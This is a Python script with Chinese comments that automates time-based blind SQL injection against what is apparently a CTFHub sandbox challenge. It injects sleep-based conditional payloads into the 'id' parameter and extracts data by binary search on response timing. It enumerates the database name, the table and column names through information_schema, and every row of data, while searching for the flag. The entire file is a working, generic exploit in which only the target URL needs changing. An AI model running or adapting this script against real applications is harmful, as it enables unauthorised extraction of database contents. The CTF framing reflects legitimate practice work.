import requests
import time

# 目标URL
url = "http://challenge-905fb4356186d661.sandbox.ctfhub.com:10800"  # 替换为实际题目URL
id =''   #注入点，把这行删了默认为id

# 时间盲注函数 - 通过响应时间判断条件真假
def time_based_injection(payload):
    start_time = time.time()
    try:
        # 发送请求，注意注入点参数是id
        response = requests.get(url, params={"id": payload}, timeout=10)
        elapsed_time = time.time() - start_time
        # 如果响应时间超过2秒，说明条件为真
        return elapsed_time > 2
    except:
        return False


# 获取字符串长度
def get_length(query):
    length = 0
    for i in range(1, 100):
        # 使用二分法判断长度
        payload = f"1 and if(({query})={i},sleep(2),0)"
        if time_based_injection(payload):
            length = i
            break
    return length


# 逐字符获取数据
def get_data(query, length):
    result = ""
    for position in range(1, length + 1):
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            # 使用二分法判断字符ASCII码
            payload = f"1 and if(ascii(substr(({query}),{position},1))>{mid},sleep(2),0)"
            if time_based_injection(payload):
                low = mid + 1
            else:
                payload = f"1 and if(ascii(substr(({query}),{position},1))={mid},sleep(2),0)"
                if time_based_injection(payload):
                    result += chr(mid)
                    print(f"当前进度: {result}")
                    break
                high = mid - 1
    return result


# 主函数
def main():
    print("开始时间盲注攻击...")

    # 1. 获取当前数据库名
    print("\n[1] 获取当前数据库名...")
    db_length = get_length("select length(database())")
    print(f"数据库名长度: {db_length}")
    database_name = get_data("select database()", db_length)
    print(f"数据库名: {database_name}")

    # 2. 获取所有表名
    print("\n[2] 获取表名...")
    # 先获取表数量
    table_count_length = get_length("select count(*) from information_schema.tables where table_schema=database()")
    table_count = int(
        get_data("select count(*) from information_schema.tables where table_schema=database()", table_count_length))
    print(f"表数量: {table_count}")

    tables = []
    for i in range(table_count):
        table_length = get_length(
            f"select length(table_name) from information_schema.tables where table_schema=database() limit {i},1")
        table_name = get_data(
            f"select table_name from information_schema.tables where table_schema=database() limit {i},1", table_length)
        tables.append(table_name)
        print(f"表{i + 1}: {table_name}")

    # 3. 获取每个表的列名
    print("\n[3] 获取列名...")
    columns_info = {}
    for table in tables:
        print(f"获取表 {table} 的列信息...")
        # 获取列数量
        col_count_length = get_length(
            f"select count(*) from information_schema.columns where table_name='{table}' and table_schema=database()")
        col_count = int(get_data(
            f"select count(*) from information_schema.columns where table_name='{table}' and table_schema=database()",
            col_count_length))

        columns = []
        for j in range(col_count):
            col_length = get_length(
                f"select length(column_name) from information_schema.columns where table_name='{table}' and table_schema=database() limit {j},1")
            col_name = get_data(
                f"select column_name from information_schema.columns where table_name='{table}' and table_schema=database() limit {j},1",
                col_length)
            columns.append(col_name)
            print(f"  列{j + 1}: {col_name}")

        columns_info[table] = columns

    # 4. 获取表数据
    print("\n[4] 获取数据内容...")
    for table, columns in columns_info.items():
        print(f"\n表 {table} 的数据:")

        # 获取行数
        row_count_length = get_length(f"select count(*) from {table}")
        row_count = int(get_data(f"select count(*) from {table}", row_count_length))
        print(f"行数: {row_count}")

        for row in range(row_count):
            print(f"第{row + 1}行数据:")
            row_data = {}
            for col in columns:
                # 获取数据长度
                data_length = get_length(f"select length({col}) from {table} limit {row},1")
                if data_length > 0:
                    data = get_data(f"select {col} from {table} limit {row},1", data_length)
                    row_data[col] = data
                    print(f"  {col}: {data}")

            # 如果找到flag相关的数据，特别标注
            for key, value in row_data.items():
                if 'flag' in value.lower():
                    print(f"🚩 发现flag: {value}")


if __name__ == "__main__":
    main()